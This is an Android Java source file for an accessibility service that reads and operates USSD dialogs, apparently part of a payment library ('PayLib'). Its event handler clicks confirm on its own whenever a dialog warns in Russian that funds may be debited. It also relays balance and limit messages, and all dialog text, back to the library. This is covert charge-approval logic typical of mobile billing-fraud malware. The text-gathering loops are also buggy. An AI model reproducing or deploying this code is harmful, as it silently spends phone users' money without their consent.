package  com.p2plib2.ussd;


import android.accessibilityservice.AccessibilityService;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.os.Bundle;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import com.p2plib2.Logger;
import com.p2plib2.PayLib;

import static com.p2plib2.PayLib.flagok;

/**
 * AccessibilityService for ussd windows on Android mobile Telcom
 *
 * @author Romell Dominguez
 * @version 1.1.c 27/09/2018
 * @since 1.0.a
 */
public class AccessService extends AccessibilityService {

    private static String TAG = AccessService.class.getSimpleName();

    private static AccessibilityEvent event;

    /**
     * Catch widget by Accessibility, when is showing at mobile display
     *
     * @param event AccessibilityEvent
     */
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (flagok) {
            this.event = event;
            Logger.lg(String.format(
                    "onAccessibilityEvent: [type] %s [class] %s [package] %s [time] %s [text] %s",
                    event.getEventType(), event.getClassName(), event.getPackageName(),
                    event.getEventTime(), event.getText()));
            String str = "";
            for (int i = 0; i < event.getText().size() - 1; i++) {
                str += event.getText().get(1);
            }
            if (str.contains("могут быть списаны средства")) {
                clickOnButton(event, 0);
            }
            if (str.contains("Превышен лимит услуги") || str.contains("недостаточно средств")) {
                PayLib.getSMSResult(str);
                clickOnButton(event, 0);
            } else {
                if (LoginView(event) && notInputText(event)) {
                    // first view or logView, do nothing, pass / FIRST MESSAGE
                    Logger.lg("FIRST MESSAGE");
                    clickOnButton(event, 0);
                    USSDController.instance.callbackInvoke.over(event.getText().get(0).toString());
                } else if (problemView(event) || LoginView(event)) {
                    // deal down
                    Logger.lg("deal down " + event.getText().get(0).toString());
                    clickOnButton(event, 1);
                    USSDController.instance.callbackInvoke.over(event.getText().get(0).toString());
                } else if (isUSSDWidget(event)) {
                    // ready for work
                    Logger.lg("ready for work " + event.getText().get(0).toString());
                    String response = event.getText().get(0).toString();
                    Logger.lg("response new" + response);
                    if (notInputText(event)) {
                        // not more input panels / LAST MESSAGE
                        // sent 'OK' button
                        clickOnButton(event, 0);
                        USSDController.instance.callbackInvoke.over(response);
                    } else {
                        Logger.lg("USSDController.instance.callbackMessage " + USSDController.instance.callbackMessage);
                        // sent option 1
                        if (USSDController.instance.callbackMessage == null)
                            USSDController.instance.callbackInvoke.responseInvoke(response);
                        else {
                            USSDController.instance.callbackMessage.responseMessage(response);
                            USSDController.instance.callbackMessage = null;
                        }
                    }
                }
            }
        } else if (event.getText().size() != 0) {
            String str = "";
            for (int i = 0; i < event.getText().size() - 1; i++) {
                str += event.getText().get(1);
            }
            PayLib.feedback.callResult(str);
            if (str.contains("могут быть списаны средства")) {
                clickOnButton(event, 0);
            }
        }
    }

    /**
     * Send whatever you want via USSD
     *
     * @param text any string
     */
    public static void send(String text) {
        setTextIntoField(event, text);
        clickOnButton(event, 1);
    }

    /**
     * set text into input text at USSD widget
     *
     * @param event AccessibilityEvent
     * @param data  Any String
     */
    private static void setTextIntoField(AccessibilityEvent event, String data) {
        USSDController ussdController = USSDController.instance;
        Bundle arguments = new Bundle();
        if (arguments != null) {
            arguments.putCharSequence(
                    AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, data);
            for (int i = 0; i < event.getSource().getChildCount(); i++) {
                AccessibilityNodeInfo node = event.getSource().getChild(i);
                Logger.lg(i + ":" + node.getClassName());
                if (node != null && node.getClassName().equals("android.widget.EditText")
                        && !node.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, arguments)) {
                    ((ClipboardManager) ussdController.context
                            .getSystemService(Context.CLIPBOARD_SERVICE))
                            .setPrimaryClip(ClipData.newPlainText("text", data));
                    node.performAction(AccessibilityNodeInfo.ACTION_PASTE);
                }
            }
        }
    }

    /**
     * Method evaluate if USSD widget has input text
     *
     * @param event AccessibilityEvent
     * @return boolean has or not input text
     */
    protected static boolean notInputText(AccessibilityEvent event) {
        boolean flag = true;
        AccessibilityNodeInfo nodeInfo = event.getSource();
        if (nodeInfo != null)
            for (int i = 0; i < nodeInfo.getChildCount(); i++) {
                AccessibilityNodeInfo node = event.getSource().getChild(i);
                if (node != null && node.getClassName().equals("android.widget.EditText"))
                    flag = false;
            }
        return flag;
    }

    /**
     * The AccessibilityEvent is instance of USSD Widget class
     *
     * @param event AccessibilityEvent
     * @return boolean AccessibilityEvent is USSD
     */
    private boolean isUSSDWidget(AccessibilityEvent event) {
        return (event.getClassName().equals("amigo.app.AmigoAlertDialog")
                || event.getClassName().equals("android.app.AlertDialog"));
    }

    /**
     * The View has a login message into USSD Widget
     *
     * @param event AccessibilityEvent
     * @return boolean USSD Widget has login message
     */
    private boolean LoginView(AccessibilityEvent event) {
        return isUSSDWidget(event)
                && USSDController.instance.map.get(USSDController.KEY_LOGIN)
                .contains(event.getText().get(0).toString());
    }

    /**
     * The View has a problem message into USSD Widget
     *
     * @param event AccessibilityEvent
     * @return boolean USSD Widget has problem message
     */
    protected boolean problemView(AccessibilityEvent event) {
        return isUSSDWidget(event)
                && USSDController.instance.map.get(USSDController.KEY_ERROR)
                .contains(event.getText().get(0).toString());
    }

    /**
     * click a button using the index
     *
     * @param event AccessibilityEvent
     * @param index button's index
     */
    protected static void clickOnButton(AccessibilityEvent event, int index) {
        Logger.lg("clickOnButton " + event.getSource());
        if (event.getSource() != null) {
            int count = -1;
            Logger.lg("event.getSource().getChildCount() " + event.getSource().getChildCount());
            for (int i = 0; i < event.getSource().getChildCount(); i++) {
                AccessibilityNodeInfo nodeButton = event.getSource().getChild(i);
                Logger.lg(" nodeButton.getClassName().toString() " + nodeButton);
                if (nodeButton != null) {
                    if (nodeButton.getClassName().toString().toLowerCase().contains("button")) {
                        count++;
                        if (count == index) {
                            nodeButton.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                        }
                    }
                    if (nodeButton.getClassName().toString().toLowerCase().contains("scrollview")) {
                        Logger.lg("nodeButton " + nodeButton.getText());
                        if (nodeButton.getChildCount() == 1) {
                            nodeButton.getChild(0).performAction(AccessibilityNodeInfo.ACTION_CLICK);
                        } else {
                            nodeButton.getChild(1).performAction(AccessibilityNodeInfo.ACTION_CLICK);
                        }
                    }
                }
            }
        }
    }

    /**
     * Active when SO interrupt the application
     */
    @Override
    public void onInterrupt() {
        Logger.lg("onInterrupt");
    }

    /**
     * Configure accessibility server from Android Operative System
     */
    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        Logger.lg("onServiceConnected");
    }
}